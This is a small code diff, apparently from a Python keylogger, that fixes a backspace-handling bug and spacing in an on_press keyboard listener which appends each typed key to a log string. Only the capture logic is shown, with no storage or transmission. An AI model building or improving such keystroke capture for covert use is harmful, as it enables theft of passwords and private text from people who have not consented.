@@ -38,11 +38,11 @@ def on_press(key):
         log+= key.char 
     except AttributeError:
         if key == keyboard.Key.space:
-            log +=" "
+            log += " "
         elif key == keyboard.Key.enter:
             log += "\n"
-        elif keyboard.Key.backspace:
-            log+="[<]"
+        elif key == keyboard.Key.backspace:
+            log += "[<]"
         else:
             pass # Ignorar control, shift, etc...
 
